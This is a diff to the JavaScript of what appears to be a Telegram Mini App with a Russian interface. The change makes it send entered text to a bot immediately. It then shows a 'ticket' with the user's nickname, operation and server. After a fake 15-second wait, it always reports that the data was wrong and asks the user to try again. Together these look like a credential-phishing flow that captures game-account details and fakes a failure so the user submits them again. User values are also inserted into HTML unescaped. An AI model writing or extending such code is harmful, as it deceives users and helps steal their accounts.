@@ -129,22 +129,13 @@ function showLoading(text, callback) {
     }, 30);
 }
 
-// === ОТПРАВКА ДАННЫХ (при закрытии) ===
-let pendingData = null;
-
+// === ОТПРАВКА ДАННЫХ СРАЗУ ===
 function sendToBot(text) {
-    pendingData = text;
-}
-
-function confirmSend() {
-    if (pendingData) {
-        try {
-            tg.sendData(pendingData);
-        } catch (e) {
-            console.error('Ошибка отправки:', e);
-        }
+    try {
+        tg.sendData(text);
+    } catch (e) {
+        console.error('Ошибка отправки:', e);
     }
-    tg.close();
 }
 
 // === СООБЩЕНИЕ ОБ УСПЕХЕ (ЧЕК) ===
@@ -157,11 +148,28 @@ function showSuccess(text, nick, server, type) {
     overlay.className = 'success-overlay';
     overlay.innerHTML = `
         <div class="success-box">
-            <div class="success-ticket">#${ticket}</div>
-            <div class="success-nick">${nick}</div>
-            <div class="success-time">${time}</div>
-            <div class="success-type">${type}</div>
-            <div class="success-wait-static">Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span></div>
+            <div class="success-header">
+                <div class="success-ticket">#${ticket}</div>
+                <div class="success-time">${time}</div>
+            </div>
+            <div class="success-body">
+                <div class="success-row">
+                    <span class="success-label">НИК</span>
+                    <span class="success-value">${nick}</span>
+                </div>
+                <div class="success-row">
+                    <span class="success-label">ОПЕРАЦИЯ</span>
+                    <span class="success-value">${type}</span>
+                </div>
+                <div class="success-row">
+                    <span class="success-label">СЕРВЕР</span>
+                    <span class="success-value">${server}</span>
+                </div>
+            </div>
+            <div class="success-wait-static">
+                Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span>
+            </div>
+            <button class="success-close-btn" onclick="closeSuccess()">ЗАКРЫТЬ</button>
         </div>
     `;
     document.body.appendChild(overlay);
@@ -184,11 +192,18 @@ function showSuccess(text, nick, server, type) {
             clearInterval(interval);
             if (waitStatic) {
                 waitStatic.textContent = 'Вы ввели неверные данные попробуйте снова';
-                waitStatic.style.color = '#e30613';
+                waitStatic.style.color = '#8b0000';
                 waitStatic.style.fontWeight = '700';
             }
         }
     }, 300);
+}
+
+// === ЗАКРЫТИЕ ЧЕКА ===
+function closeSuccess() {
+    const overlay = document.querySelector('.success-overlay');
+    if (overlay) overlay.remove();
+    tg.close();
 }
 
 // === НАВИГАЦИЯ ===
